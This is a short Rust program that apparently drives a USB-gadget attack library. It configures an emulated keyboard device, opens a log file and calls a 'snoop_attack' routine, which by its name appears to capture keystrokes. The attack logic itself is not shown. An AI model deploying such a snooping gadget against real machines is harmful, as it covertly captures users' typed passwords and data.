use usb_gadget;
use wms::{Attack, InputAttack, SnoopAttack, WMSError, WMSKeyboardDevice, WMSMassStorageDevice};

fn main() -> Result<(), Box<dyn std::error::Error>> {
    usb_gadget::remove_all().expect("Could not remove existing USB gadget");

    let mut msd = WMSKeyboardDevice::new();
    let reg_gadget = msd.setup_gadget()?;
    msd.open_logfile("./storage")?;
    msd.snoop_attack()?;

    Ok(())
}
